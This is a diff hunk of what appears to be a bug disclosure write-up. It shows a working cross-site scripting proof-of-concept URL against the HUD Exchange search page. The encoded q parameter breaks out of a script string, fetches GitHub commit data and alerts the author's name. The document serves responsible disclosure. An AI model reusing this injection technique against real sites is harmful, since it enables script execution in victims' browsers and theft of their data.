@@ -11,7 +11,7 @@ I reported this bug in detail through the contact mechanism on the HUD Exchange 
 ##Demo
 
 This `fetch()`es my commit info from Github and parses it, then alerts my name.
-<https://www.hudexchange.info/search/?dsp=&ct=&collection=&q=%5C%27%3B%20%2F*%20"%3B%20%2F%2F%20*%2F%20fetch%28%22https%3A//api.github.com/repos/trevorgross/installarch/commits%22%29.then%28response%20%3D%3E%20response.json%28%29%29.then%28commits%20%3D%3E%20alert%28commits%5B0%5D.commit.author.name%29%29%3B%20/>
+<https://www.hudexchange.info/search/?dsp=&ct=&collection=&q=%5C%27%3B%20%2F*%20"%3B%20%2F%2F%20*%2F%20fetch%28%22https%3A//api.github.com/repos/trevorgross/installarch/commits%22%29.then%28response%20%3D%3E%20response.json%28%29%29.then%28commits%20%3D%3E%20alert%28commits%5B0%5D.commit.author.name%29%29%3B%20//>
 
 ##Why
 
